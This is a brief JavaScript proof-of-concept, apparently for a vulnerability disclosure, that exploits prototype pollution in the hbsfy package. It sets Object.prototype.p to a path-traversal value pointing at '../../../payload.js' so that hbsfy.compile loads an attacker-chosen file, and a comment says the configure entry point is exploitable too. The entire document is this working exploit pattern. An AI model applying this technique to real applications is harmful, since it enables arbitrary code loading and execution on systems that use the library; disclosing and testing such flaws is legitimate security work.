var hbsfy = require("hbsfy")

Object.prototype.p = '../../../payload.js'; // or .precompiler

// hbsfy.configure entry point is also exploitable
hbsfy.compile('file');